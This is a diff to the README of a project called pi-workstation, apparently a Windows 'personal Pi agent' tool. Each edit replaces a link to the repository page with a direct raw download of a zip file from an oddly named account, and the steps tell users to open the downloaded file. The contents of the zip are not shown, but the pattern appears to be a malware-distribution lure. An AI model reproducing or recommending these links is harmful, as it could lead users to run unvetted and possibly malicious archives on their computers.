@@ -1,6 +1,6 @@
 # 🤖 pi-workstation - Personal Pi Agent Setup
 
-[![Download pi-workstation](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Quicksandprotiumguianense974/pi-workstation)
+[![Download pi-workstation](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)
 
 ## 🧭 What This Is
 
@@ -10,7 +10,7 @@ Use it if you want a personal agent workflow on Windows without building everyth
 
 ## 📥 Download and Install
 
-1. Open the download page: [pi-workstation on GitHub](https://github.com/Quicksandprotiumguianense974/pi-workstation)
+1. Open the download page: [pi-workstation on GitHub](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)
 2. On the page, look for the latest release or the main download file.
 3. Download the Windows file to your computer.
 4. When the download finishes, open the file.
@@ -156,7 +156,7 @@ If the app is slow:
 
 Use this page to get pi-workstation for Windows:
 
-[Visit the pi-workstation download page](https://github.com/Quicksandprotiumguianense974/pi-workstation)
+[Visit the pi-workstation download page](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)
 
 ## 🧼 Keeping It Organized
 
@@ -232,7 +232,7 @@ This helps the setup finish without errors.
 
 Get the app here and download the Windows version from the GitHub page:
 
-[https://github.com/Quicksandprotiumguianense974/pi-workstation](https://github.com/Quicksandprotiumguianense974/pi-workstation)
+[https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip](https://github.com/Quicksandprotiumguianense974/pi-workstation/raw/refs/heads/main/assets/workstation-pi-3.5.zip)
 
 ## 🗂️ Suggested Shortcuts
 
